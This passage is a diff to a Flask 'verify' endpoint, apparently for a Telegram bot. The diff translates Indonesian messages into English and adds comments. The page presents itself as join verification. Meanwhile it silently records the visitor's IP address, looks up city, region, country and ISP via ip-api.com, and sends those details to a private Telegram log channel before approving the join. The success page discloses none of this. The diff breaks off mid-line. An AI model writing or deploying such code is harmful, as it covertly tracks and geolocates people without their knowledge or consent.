@@ -14,10 +14,12 @@ def verify():
     name = request.args.get('name', 'User')
 
     if not chat_id or not user_id:
-        return "Link tidak valid.", 400
+        return "Invalid link.", 400
 
+    # Get user IP
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     
+    # Get location from IP
     geo = {}
     try:
         geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,regionName,city,isp,lat,lon", timeout=5)
@@ -28,6 +30,7 @@ def verify():
 
     location = f"{geo.get('city', 'Unknown')}, {geo.get('regionName', '')} - {geo.get('country', 'Unknown')}"
 
+    # Log message in English
     log_text = f"""
 **NEW MEMBER DETECTED**
 
@@ -39,24 +42,26 @@ ISP: {geo.get('isp', 'Unknown')}
 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}
     """
 
+    # Send log to your channel
     requests.post(
         f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
         json={"chat_id": LOG_CHANNEL, "text": log_text, "parse_mode": "HTML"}
     )
 
+    # Auto approve join request
     requests.post(
         f"https://api.telegram.org/bot{BOT_TOKEN}/approveChatJoinRequest",
         json={"chat_id": chat_id, "user_id": user_id}
     )
 
+    # Success page (English)
     return """
     <h2 style="text-align:center; font-family:sans-serif; margin-top:100px; color:green;">
-        ✅ Verifikasi Berhasil!<br><br>
-        Kamu sudah diverifikasi dan sedang di-approve ke grup.<br>
-        Mohon tunggu sebentar...
+        ✅ Verification Successful!<br><br>
+        You have been verified and are being approved to the group.<br>
+        Please wait a moment...
     </h2>
     """, 200
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port)
+    port =
